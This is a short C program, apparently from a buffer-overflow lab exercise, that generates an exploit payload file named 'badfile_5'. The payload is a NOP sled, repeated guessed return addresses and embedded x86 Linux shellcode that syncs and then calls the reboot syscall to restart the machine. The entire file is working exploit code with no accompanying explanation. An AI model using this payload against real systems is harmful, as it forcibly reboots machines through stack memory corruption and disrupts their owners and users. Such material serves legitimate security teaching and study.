#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]= "\xb0\x24"                    /* mov    $0x24,%al */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x58"                    /* mov    $0x58,%al */
		"\xbb\xad\xde\xe1\xfe"        /* mov    $0xfee1dead,%ebx */
		"\xb9\x69\x19\x12\x28"        /* mov    $0x28121969,%ecx */
		"\xba\x67\x45\x23\x01"        /* mov    $0x1234567,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80";                   /* int    $0x80 */


unsigned long stack_ptr(){
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    memset(&buffer, 0x90, sizeof(buffer));

    char *ptr;
    int offset = 100, bsz = 517, i;
    long *addr_ptr = buffer, addr = stack_ptr() + offset;

    for (i = 0; i < 24; i++)
    	*(addr_ptr++) = addr;

    for (i = 0; i < strlen(shellcode); i++) 
     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[bsz - 1] = '\0';
    FILE *badfile = fopen("./badfile_5", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
